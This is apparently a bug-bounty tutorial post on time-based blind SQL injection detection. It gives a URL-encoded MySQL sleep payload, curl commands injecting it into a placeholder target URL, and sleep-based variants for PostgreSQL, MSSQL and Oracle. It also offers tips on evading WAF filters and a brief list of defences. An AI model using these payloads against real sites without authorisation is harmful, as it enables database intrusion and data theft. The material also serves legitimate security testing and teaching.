# 🎓 SQL Injection: Time-Based Blind Detection Payload
<img width="1400" height="600" alt="Time-Based Blind Detection Payload" src="https://github.com/user-attachments/assets/e19f7caf-382c-49c1-8925-8a7ccf097dd9" />

**Time-based blind SQL injection is one of the most reliable techniques when no data is reflected in the response.** Instead of seeing output, you measure how long the server takes to respond—if it sleeps, the injection worked.

---

## 🔥 The Payload

```text
'%2b(select*from(select(sleep(5)))a)%2b'
```

**URL Decoded:**

```sql
'+(select*from(select(sleep(5)))a)+'
```

**What It Does:**

- `%2b` = `+` (URL encoded)
- `sleep(5)` → Forces the database to pause for **5 seconds**
- If the response takes ~5 seconds → **SQL injection confirmed**
- If instant → Not vulnerable or filtered

---

## 🛠 How It Works

**Breaking It Down:**

```sql
'+(select*from(select(sleep(5)))a)+'
```

1. **`'`** → Closes the original string in the query
2. **`+`** → String concatenation (MySQL)
3. **`(select*from(select(sleep(5)))a)`** → Subquery that executes `sleep(5)`
4. **`a`** → Alias for the subquery result (required by MySQL)
5. **`+`** → Concatenation back to the original query

**Result:** The database executes `sleep(5)` and the HTTP response is delayed by 5 seconds.

---

## 💡 Why This Technique Matters

▫️ **Blind Detection** → Works even when no data is shown  
▫️ **Reliable Signal** → Time difference is clear and measurable  
▫️ **Bypasses Filters** → Less likely to trigger basic WAF rules than UNION-based payloads  
▫️ **Works on MySQL/MariaDB** → Common in PHP/WordPress targets

---

## ⚡️ Testing Methodology

**Step 1: Baseline Response Time**

```bash
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/product?id=1"
```

Note the normal response time (e.g., 0.3s)

**Step 2: Inject Time-Based Payload**

```bash
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/product?id=1'%2b(select*from(select(sleep(5)))a)%2b'"
```

**Step 3: Compare Times**

- Normal: ~0.3s
- Injected: ~5.3s → **Vulnerable!**

---

## 🎯 Variations for Different Databases

| **DatabasePayload** | |
| ------------------- | --- |
| **MySQL** | `'+(select*from(select(sleep(5)))a)+'` |
| **PostgreSQL** | `';SELECT pg_sleep(5);--` |
| **MSSQL** | `';WAITFOR DELAY '0:0:5';--` |
| **Oracle** | `'\|\|dbms_pipe.receive_message(('a'),5)\|\|'` |

**MySQL Alternative (Cleaner):**

```sql
' AND SLEEP(5)-- -
```

```sql
' OR SLEEP(5)-- -
```

---

## 🛡 How to Defend Against This

1. **Parameterized Queries** → Use prepared statements everywhere
2. **Input Validation** → Reject unexpected characters like `'`, `+`, `(`
3. **WAF Rules** → Block `sleep(`, `benchmark(`, `pg_sleep` patterns
4. **Least Privilege** → Database user should not have unnecessary permissions
5. **Rate Limiting** → Limit repeated requests with suspicious payloads

---

## 💰 Bug Bounty Impact

🔸 **Critical Severity** → Full database access possible  
🔸 **Data Exfiltration** → Dump credentials, PII, financial data  
🔸 **Chain Potential** → SQLi → File Read → RCE  
🔸 **High Bounties** → SQLi remains one of the most rewarded vulnerabilities

---

🔔 **Follow @cybersecplayground for more SQLi and web security techniques!**

✅ **Like & Share if you found SQLi with this payload! 🚀**

**#SQLi #SQLInjection #BugBounty #WebSecurity #CyberSecurity #InfoSec #PenTesting #Hacking #TimeBasedBlind**

⚠️ **Pro Tip:** Always test both `SLEEP()` and `BENCHMARK()`—some WAFs block one but not the other. Also try different sleep durations (3s, 5s, 10s) to confirm the delay is intentional!
